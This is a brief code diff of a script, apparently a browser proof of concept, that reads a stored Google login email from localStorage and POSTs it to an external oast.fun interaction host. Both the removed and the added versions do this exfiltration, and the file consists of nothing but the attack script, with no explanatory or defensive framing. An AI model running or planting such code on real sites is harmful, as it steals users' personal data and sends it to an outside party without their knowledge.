@@ -1,19 +1,10 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-  try {
-    const exfil = localStorage.getItem("iframe_safari_poc");
-    if (exfil) {
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: exfil })
-      });
-    }
-  } catch (e) {
-    // Some Safari versions may restrict even localStorage – fallback mechanism
+  const email = localStorage.getItem("google_login_email");
+  if (email) {
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email })
+    });
   }
 </script>
-</body>
-</html>
